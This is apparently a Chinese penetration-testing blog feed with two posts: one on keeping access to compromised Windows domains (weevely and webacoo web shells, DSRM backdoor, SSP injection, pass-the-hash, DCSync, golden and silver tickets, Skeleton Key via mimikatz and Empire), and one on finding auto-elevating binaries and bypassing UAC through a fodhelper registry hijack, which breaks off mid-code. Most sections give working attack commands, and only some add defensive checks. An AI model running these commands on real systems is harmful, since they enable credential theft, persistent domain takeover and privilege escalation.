title="weevely后门"></a>weevely后门</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token number">1</span><span class="token punctuation">.</span>执行命令和测览远程文件<span class="token number">2</span><span class="token punctuation">.</span>检测常见的服务器配置问题<span class="token number">3</span><span class="token punctuation">.</span>创建 TCP Shell 和 Reverse Shell<span class="token number">4</span><span class="token punctuation">.</span>打扫描端口<span class="token number">5</span><span class="token punctuation">.</span>安装HTTP代理<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>weevely <url> <password> [cmd] #连接一句话<br>weevely session <path> cmd #加载会话文件<br>weevely generate <password> <path> # 生成后门代理，一般用这个</path></password></path></password></url></p><h2 id="webacco后门"><a href="#webacco后门" class="headerlink" title="webacco后门"></a>webacco后门</h2><ul><li>安装</li></ul><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">apt install webacoo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>生成shell</li></ul><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">webacoo <span class="token operator">-</span>g <span class="token operator">-</span>o <span class="token number">123</span><span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>连接后门</li></ul><p>webacoo -t -u <a href="http://192.168.x.x/123.php">http://192.168.x.x/123.php</a></p><h1 id="域控制器权限持久化"><a href="#域控制器权限持久化" class="headerlink" title="域控制器权限持久化"></a>域控制器权限持久化</h1><h2 id="DSRM域后门"><a href="#DSRM域后门" class="headerlink" title="DSRM域后门"></a>DSRM域后门</h2><p>DSRM （ Directory Services Restore Mode,目录服务恢复模式）是Windows域环境中域控制器的安全模式启动选项。每个域控制器都有一个本地管理员账户（也就是DSRM账户）</p><p>DSRM的用途是:允许管理员在域环境中出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。在 域环境创建初期，DSRM的密码需要在安装DC时设置，且很少会被重置。修改DSRM密码最基本的方法是在DC上运行ntdsutiI命令行工具。<br>在渗透测试中，可以使用DSRM账号对域环境进行持久化操作。</p><ul><li>如果域控制器的系统版本为Windows Server 2008,需要安装<code>KB961320</code>才可以使用指定域账号的密码对DSRM的密码进行同步。</li><li>在 Windows Server 2008以后版本的系统中不需要安装此补丁。</li><li>如果域控制器的系统版本为Windows Server 2003则不能使用该方法进行持久化操作</li></ul><p>我们知道，每个域控制器都有本地管理员账号和密码（与城管理员账号和密码不同）DSRM账号可以 作为一个域控制器的本地管理品用户，通过网络连接城控制器，进而控制域控制器。</p><p><strong>简单来讲 就是当初创建域的时候：键入目录还原的(DSRM)密码</strong></p><h3 id="修改DSRM密码"><a href="#修改DSRM密码" class="headerlink" title="修改DSRM密码"></a>修改DSRM密码</h3><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p>在域控制器上打开命令行环境</p><pre class="line-numbers language-none"><code class="language-none">1. NTDSUTIL: 登录ntdsutil2. set dsrm password #设置DSRM密码3. reset password on server null #在当前域控服务器上恢复DSRM密码4. &lt;PASSWORD&gt; # 修改后的密码5. q # 退出密码设置模式6. q # 退出NTDSUTIL模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改成功 用ipc登录尝试</p><p>这里是登录不上的  因为域控默认是禁用DSRM的</p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>简单来讲 就是用krbtgt用户的NTLM hash覆盖administrator用户的NTLM  hash</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">ntdsutil<span class="token keyword">set</span> dsrm passwordsync <span class="token keyword">from</span> domain account krbtgtqq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以进行查看是否成功</p><pre class="line-numbers language-none"><code class="language-none">lsadump::samlsadump::lsa /patch /name:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="DSRM的三种登录方式"><a href="#DSRM的三种登录方式" class="headerlink" title="DSRM的三种登录方式"></a>DSRM的三种登录方式</h3><ul><li>0：默认值，只有当城控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号。</li><li>1:只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器。</li><li>2:在任何情况下，都可以使用DSRM管理员账号登录域控制器。</li></ul><p>如果要使用DSRM账号通过网络登录域控制器，需要将该值设置为2</p><p>powershell下执行</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">New<span class="token operator">-</span>ItemProperty <span class="token string">"hklm:\system\currentcontrolset\control\lsa\" -name "</span>dsrmadminlogonbehavior" <span class="token operator">-</span><span class="token keyword">value</span> <span class="token number">2</span> <span class="token operator">-</span>propertyType DWORD<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="使用DSRM账号通过网络远程登录域控制器"><a href="#使用DSRM账号通过网络远程登录域控制器" class="headerlink" title="使用DSRM账号通过网络远程登录域控制器"></a>使用DSRM账号通过网络远程登录域控制器</h3><p>使用mimikatz进行哈希传递，在域成员机器的管理模式下打开mimikatz：</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"privilege::debug"</span> "sekurlsa<span class="token punctuation">::</span>pth <span class="token operator">/</span>user<span class="token punctuation">:</span>Administrator <span class="token operator">/</span>domain<span class="token punctuation">:</span>xxx <span class="token operator">/</span>ntlm<span class="token punctuation">:</span>xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="使用Mimikatz的scysnc功能远程转储krbtgt的NTML-Hash"><a href="#使用Mimikatz的scysnc功能远程转储krbtgt的NTML-Hash" class="headerlink" title="使用Mimikatz的scysnc功能远程转储krbtgt的NTML Hash"></a>使用Mimikatz的scysnc功能远程转储krbtgt的NTML Hash</h3><p>哈希传递攻击完成后</p><p>弹出命令窗口 在该窗口下打开mimikatz</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">lsadump<span class="token punctuation">::</span>dcsync <span class="token operator">/</span>domain<span class="token punctuation">:</span>xiyou<span class="token punctuation">.</span>dayu<span class="token punctuation">.</span>com <span class="token operator">/</span>dc<span class="token punctuation">:</span>dc <span class="token operator">/</span>user<span class="token punctuation">:</span>krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="DSRM域后门防御措施"><a href="#DSRM域后门防御措施" class="headerlink" title="DSRM域后门防御措施"></a>DSRM域后门防御措施</h3><ul><li>定期检查注册表中用于控制DSRM登录方式的键值<code>hklm:\system\currentcontrolset\control\lsa\</code>确认该键值为1,或者删除该键值</li><li>定期修改城中所有城控制器的DSRM账号。</li><li>经常检查ID为4794的日志。当试设置活动目录服务还原模式的管理员密码会被记录在4794日志中。</li></ul><h2 id="SSP维持域控权限"><a href="#SSP维持域控权限" class="headerlink" title="SSP维持域控权限"></a>SSP维持域控权限</h2><h3 id="利用mimikatz-注入"><a href="#利用mimikatz-注入" class="headerlink" title="利用mimikatz 注入"></a>利用mimikatz 注入</h3><p>使用mimikatz将伪造的SSP注入内存。这样做不会在系统中留下二进制文件</p><p>但如果域控制器重启，被注入内存的伪造的SSP将会丢失。</p><p>在实际网络维护中，可以针对这一点采取相 应的防御措施。</p><p>在域控制器中以管理员权限打开mimikatz,分别输入如下命令：</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">privilege<span class="token punctuation">::</span><span class="token class-name">debug</span>misc<span class="token punctuation">::</span>memssp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注销一下</p><p>密码存储在日志文件 <code>C:\Windows\System32\mimilsa.log</code> 中</p><h3 id="利用mimikatz下的mimicom-idl文件-现在被查杀"><a href="#利用mimikatz下的mimicom-idl文件-现在被查杀" class="headerlink" title="利用mimikatz下的mimicom.idl文件(现在被查杀)"></a>利用mimikatz下的<code>mimicom.idl</code>文件(现在被查杀)</h3><p>将它复制到System32文件目录下<br>并将 mimilib添加到注册表中就可以了修改<code>HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa/Security Packages</code>项，加载新的DLL文件！</p><p>就是powershell下的两条命令</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">reg query hklm\system\currentcontrolset\control\lsa\ <span class="token operator">/</span>v <span class="token string">"Security Packages"</span>reg <span class="token keyword">add</span> <span class="token string">"hklm\system\currentcontrolset\control\lsa\" /v "</span>Security Packages<span class="token string">" /d "</span>kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" <span class="token operator">/</span>t REG_MULTI_SZ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>覆盖掉就可以了</p><p>重启一下</p><p>系统重启后，如果DLL被成功加载，用户在登录时输入的账户密码明文就会被记录在 <code>C:\windows\system32\kiwissp.log</code> 中</p><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><p>SSP维持域控制器权限的防御措施<br>1.检查 HKEY LOCAL MCNSSrCnContooCotroro sScrt Packages 项中是否含有可疑的 DLL 文件。<br>2.检查C:WindowsSystem32\目录下是否有可疑的DLL文件。<br>3.使用第三方工具检查LSA中是否有可疑的DLL文件。</p><h2 id="SID-History后门"><a href="#SID-History后门" class="headerlink" title="SID History后门"></a>SID History后门</h2><p>就是黄金和白银票据 </p><p>操作就不再阐述了，写一写底层</p><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在Kerberos认证中，当客户端通过AS认证后，AS会给客户端一个TGT，kbrtgt的NTLM hash的又是固定的 因此可以得到krbtgt用户的NTLM hash，就可以伪造TGT进行下一步客户端与TGS的交互</p><p>而且有了金票后 就跳过了AS验证，不用验证账号和密码，因此不用担心域管理员修改密码</p><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><pre class="line-numbers language-none"><code class="language-none">不需要与AS进行交互 需要krbtgt用户的NTLM hash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><pre class="line-numbers language-none"><code class="language-none">1.域名称2.域的SID值3.域的KRBTGT账户的NTLM-Hash4.伪造任意用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在Kerberos认证中,Client带着TGS票据向Server上的某个服务发起请求后</p><p>Server接受到Client请求后，通过自己的NTLM hash进行解密，如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。</p><p>所以我们只需要知道Server用户的Hash就可以伪造出一个TGS票据，且不会经过KDC,但是伪造的门票只对部分服务起作用</p><h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><pre class="line-numbers language-none"><code class="language-none">1.不需要与KDC进行交互2.需要server的NTLM hash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="金票和银票的区别"><a href="#金票和银票的区别" class="headerlink" title="金票和银票的区别"></a>金票和银票的区别</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282131120.png" alt="1616989327838"></p><h3 id="服务列表"><a href="#服务列表" class="headerlink" title="服务列表"></a>服务列表</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282131121.png" alt="1616989352696"></p><h3 id="白银票据默认组"><a href="#白银票据默认组" class="headerlink" title="白银票据默认组"></a>白银票据默认组</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282131122.png" alt="1616989395206"></p><h3 id="SID-History后门优势"><a href="#SID-History后门优势" class="headerlink" title="SID History后门优势"></a>SID History后门优势</h3><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">SID History域后门的防御措施<span class="token number">1</span><span class="token punctuation">.</span>可以通过注入SID History属性完成持久化任务。<span class="token number">2</span><span class="token punctuation">.</span>拥有高权限SID的用户，可以使用PowerShell远程导出域控制器的ntds<span class="token punctuation">.</span>dit。<span class="token number">3</span><span class="token punctuation">.</span>如果不再需要通过SID History属性实现持久化，可以使用sid<span class="token punctuation">::</span>clear <span class="token operator">/</span>sam<span class="token punctuation">:</span>username清除SID Hi story的属性。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SID-History后门防范措施"><a href="#SID-History后门防范措施" class="headerlink" title="SID History后门防范措施"></a>SID History后门防范措施</h3><ul><li>经常查看域用户中SID为500的用户。</li><li>完成域迁移工作后，对有相同SID History属性的用户进定期3.定期检查ID为4765和4766的日志。4765 为将SID Histtory属性添加到用户的日志。4766为将SID History属性添加到用户失败的日志。</li></ul><h2 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h2><h3 id="手工"><a href="#手工" class="headerlink" title="手工"></a>手工</h3><p>就是万能密码</p><p>在域控制器中管理员权限打开mimikatz，将Skeleton Key注入域控中的Isass.exe进程</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">privilege<span class="token punctuation">::</span><span class="token class-name">debug</span>misc<span class="token punctuation">::</span>skeleton<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注入成功后，会在域内所有的账号中添加一个Skeleton Key,默认密码为mimikatz。</p><p>接下来可以 在域内任意用户的身份，配合该SkeletonKey，进行域内身份验证授权了</p><p>使用计算机全名是可以登录的</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">net use \\xiyou<span class="token punctuation">.</span>xiyou<span class="token punctuation">.</span>dayu<span class="token punctuation">.</span>com\ipc$ <span class="token string">"mimikatz"</span> <span class="token operator">/</span>user<span class="token punctuation">:</span>xiyou<span class="token punctuation">.</span>dayu<span class="token punctuation">.</span>com\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Empire-3"><a href="#Empire-3" class="headerlink" title="Empire"></a>Empire</h3><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">interact KFSV7YB1 # 进入agentusemodule persistence<span class="token operator">/</span>misc<span class="token operator">/</span>skeleton_keyexecute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将skeleton_key注入后，empire提示可以通过mimikatz进入系统</p><h3 id="Skeleton-Key防范措施"><a href="#Skeleton-Key防范措施" class="headerlink" title="Skeleton Key防范措施"></a>Skeleton Key防范措施</h3><p>2014年，微软在Window s操作系统中增加了 LSA保护策略，以防止Isass.cx e进程被恶意注入。从而防止mimikatz在非允作的情况下提升到debug权限。</p><pre class="line-numbers language-none"><code class="language-none">通用的Skeleton Key的防御措施列举如下：1.域管理员用户要设置强口令，确保恶意代码不会在城控制器中执行。2.在所有城用户中启用双因子认证，例如智能卡认证。3.启动（例如应用程序白名单例如AppLocker以限制mimikatz在域控制器中的运行。4.在日常网络维护中注意以下方面，也可以有效防范Skeleton Key5.只能在64位操作系统中使用，包括WinwnSren2012、Winds Sener 2012、Windows Sever 200 Wind ows Sever 2008 R2、 WindowServer 2003 R2、 Windows Server 2003。6.只有具有城管理员权限的用户可以将SleloKe。注人城控制器的lass cxe进程。7.Seleton Key被注人后，用户使用现有的密码仍然可以登录系统。8.因为Seleton Key是被注入lsass.exeex e进程的，所以它只存在于内存中。如果域控制器重启，注人的Skeleton Key将会失效<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>权限维持很重要！</p><p>我们进去的每一个点，都很不容易，不想努力白费，就做好权限维持</p><p>每当我们多一台受控机器，就可能会多一个攻击维度！</p>]]></content>
      
      
      <categories>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限维持小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白名单程序</title>
      <link href="/2021/10/28/bai-ming-dan-cheng-xu/"/>
      <url>/2021/10/28/bai-ming-dan-cheng-xu/</url>
      
        <content type="html"><![CDATA[<h2 id="白名单程序"><a href="#白名单程序" class="headerlink" title="白名单程序"></a>白名单程序</h2><p>为什么有的应用程序不需要提示UAC呢？</p><p>这是因为有的可以程序可以<strong>autoElevate(自动提升)</strong></p><p>具有<code>autoElevate</code>属性为<code>True</code>的应用程序会在启动时自动提升权限，而这些应用程序往往都具备微软的签名，微软认为它是可信的。</p><p>这类程序被统称为白名单程序，故此，在该程序启动时，将会以管理员身份启动，就不会提示UAC</p><h2 id="挖掘白名单程序"><a href="#挖掘白名单程序" class="headerlink" title="挖掘白名单程序"></a>挖掘白名单程序</h2><h3 id="四点要求"><a href="#四点要求" class="headerlink" title="四点要求"></a>四点要求</h3><pre class="line-numbers language-none"><code class="language-none">1.system32目录下2.程序的manifest标识的配置属性 autoElevate 为true3. 程序不弹出UAC弹窗4. 从注册表里查询Shell\Open\command键值对<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os <span class="token keyword">from</span> subprocess <span class="token keyword">import</span> <span class="token operator">*</span>  path <span class="token operator">=</span> <span class="token string">'c:\windows\system32'</span> files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">GetFileList</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> fileList<span class="token punctuation">)</span><span class="token punctuation">:</span>     newDir <span class="token operator">=</span> path     <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">if</span> path<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'.exe'</span><span class="token punctuation">:</span>             fileList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">)</span>     <span class="token keyword">elif</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">try</span><span class="token punctuation">:</span>             <span class="token keyword">for</span> s <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>                 newDir<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>path<span class="token punctuation">,</span>s<span class="token punctuation">)</span>                 GetFileList<span class="token punctuation">(</span>newDir<span class="token punctuation">,</span> fileList<span class="token punctuation">)</span>         <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>             <span class="token keyword">pass</span>     <span class="token keyword">return</span> fileList files <span class="token operator">=</span> GetFileList<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token keyword">for</span> eachFile <span class="token keyword">in</span> files<span class="token punctuation">:</span>     <span class="token keyword">if</span> eachFile<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'.exe'</span><span class="token punctuation">:</span>         command <span class="token operator">=</span> <span class="token string">r'.\sigcheck64.exe -m {} | findstr auto'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>eachFile<span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span>         p1 <span class="token operator">=</span> Popen<span class="token punctuation">(</span>command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>         <span class="token keyword">if</span> <span class="token string">'&lt;autoElevate&gt;true&lt;/autoElevate&gt;'</span> <span class="token keyword">in</span> p1<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gb2312'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             copy_command <span class="token operator">=</span> <span class="token string">r'copy {} .\success'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>eachFile<span class="token punctuation">)</span>             Popen<span class="token punctuation">(</span>copy_command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>             <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] {}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>eachFile<span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'success.txt'</span><span class="token punctuation">,</span> <span class="token string">'at'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                 f<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span><span class="token string">'{}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>eachFile<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134049.png" alt="image-20211031134408465"></p><p>整理所得</p><pre class="line-numbers language-none"><code class="language-none">c:\windows\system32\bthudtask.exe c:\windows\system32\changepk.exe c:\windows\system32\ComputerDefaults.exe c:\windows\system32\dccw.exe c:\windows\system32\dcomcnfg.exe c:\windows\system32\DeviceEject.exe c:\windows\system32\DeviceProperties.exe c:\windows\system32\djoin.exe c:\windows\system32\easinvoker.exe c:\windows\system32\EASPolicyManagerBrokerHost.exe c:\windows\system32\eudcedit.exe c:\windows\system32\eventvwr.exe c:\windows\system32\fodhelper.exe c:\windows\system32\fsquirt.exe c:\windows\system32\FXSUNATD.exe c:\windows\system32\immersivetpmvscmgrsvr.exe c:\windows\system32\iscsicli.exe c:\windows\system32\iscsicpl.exe c:\windows\system32\lpksetup.exe c:\windows\system32\MSchedExe.exe c:\windows\system32\msconfig.exe c:\windows\system32\msra.exe c:\windows\system32\MultiDigiMon.exe c:\windows\system32\newdev.exe c:\windows\system32\odbcad32.exe c:\windows\system32\PasswordOnWakeSettingFlyout.exe c:\windows\system32\pwcreator.exe c:\windows\system32\rdpshell.exe c:\windows\system32\recdisc.exe c:\windows\system32\rrinstaller.exe c:\windows\system32\shrpubw.exe c:\windows\system32\slui.exe c:\windows\system32\Sysprep\sysprep.exe c:\windows\system32\SystemPropertiesAdvanced.exe c:\windows\system32\SystemPropertiesComputerName.exe c:\windows\system32\SystemPropertiesDataExecutionPrevention.exe c:\windows\system32\SystemPropertiesHardware.exe c:\windows\system32\SystemPropertiesPerformance.exe c:\windows\system32\SystemPropertiesProtection.exe c:\windows\system32\SystemPropertiesRemote.exe c:\windows\system32\SystemSettingsAdminFlows.exe c:\windows\system32\SystemSettingsRemoveDevice.exe c:\windows\system32\Taskmgr.exe c:\windows\system32\tcmsetup.exec:\windows\system32\TpmInit.exe c:\windows\system32\WindowsUpdateElevatedInstaller.exe c:\windows\system32\WSReset.exe c:\windows\system32\wusa.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><p>我们也可以利用strings</p><p>进行过滤 即可</p><pre class="line-numbers language-none"><code class="language-none">strings.exe -s *.exe | findstr /i autoelevate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h2><h3 id="fodhelper-exe"><a href="#fodhelper-exe" class="headerlink" title="fodhelper.exe"></a>fodhelper.exe</h3><pre class="line-numbers language-none"><code class="language-none">c:\windows\system32\fodhelper.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134050.png" alt="image-20211031135507422"></p><p>运行之后会弹出可选功能这个 设置界面</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134051.png" alt="image-20211031135446874"></p><h3 id="Processor-Monitor"><a href="#Processor-Monitor" class="headerlink" title="Processor Monitor"></a>Processor Monitor</h3><p>使用<code>Processor Monitor</code>监听<code>fodhelper.exe</code></p><p>添加过滤</p><p>注：通常以<code>shell\open\command</code>命名的键值对存储的是可执行文件的路径</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134052.png" alt="image-20210811100231745"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134053.png" alt="image-20211031141102646"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134054.png" alt="image-20211031141131657"></p><p>经过排查</p><p>启动<code>FodHelper.exe</code>时，它会检查是否存在以下注册表项：</p><pre class="line-numbers language-none"><code class="language-none">HKCU:\Software\Classes\ms-settings\Shell\Open\command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Result显示的是</p><pre class="line-numbers language-none"><code class="language-none">NAME NOT FOUND<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134055.png" alt="image-20211031143041739"></p><p>那么我手动创建一个</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134056.png" alt="image-20211031143255480"></p><p>继续</p><p>发现它还会去</p><pre class="line-numbers language-none"><code class="language-none">HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134057.png" alt="image-20211031143702941"></p><p>那么我这里创建一个</p><pre class="line-numbers language-none"><code class="language-none">字符串值:DelegateExecute<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134058.png" alt="image-20211031143922858"></p><p>把默认键值对指向其他一个程序进行尝试</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\Administrator\Desktop\ProcessExplorer\procexp64.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134059.png" alt="image-20211031144110134"></p><p>当我运行<code>c:\windows\system32\ComputerDefaults.exe</code>的时候，发现不再弹出的是默认进程的界面，而是打开了procexp64.exe</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134060.png" alt="image-20211031144224023"></p><h3 id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h3><pre class="line-numbers language-none"><code class="language-none">1.创建注册表2.添加DelegateExecute这个键值对3.修改默认数据指向exe路径4.隐蔽性考虑<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注：c++ 操作注册表如果遇到名称为”(默认)”的处理方法：用””（空串）来处理即可</strong></p><p>API的调用，具体可以参考这里：<a href="https://docs.microsoft.com/zh-cn/windows/win32/com/registering-components">https://docs.microsoft.com/zh-cn/windows/win32/com/registering-components</a></p><h4 id="RegCreateKeyEx"><a href="#RegCreateKeyEx" class="headerlink" title="RegCreateKeyEx"></a>RegCreateKeyEx</h4><p>RegCreateKeyEx是创建注册表项的函数</p><pre class="line-numbers language-none"><code class="language-none">LONG RegCreateKeyEx(  HKEY hKey,                                  // handle to open key  LPCTSTR lpSubKey,                           // subkey name  DWORD Reserved,                             // reserved  LPTSTR lpClass,                             // class string  DWORD dwOptions,                            // special options  REGSAM samDesired,                          // desired security access  LPSECURITY_ATTRIBUTES lpSecurityAttributes, // inheritance  PHKEY phkResult,                            // key handle   LPDWORD lpdwDisposition                     // disposition value 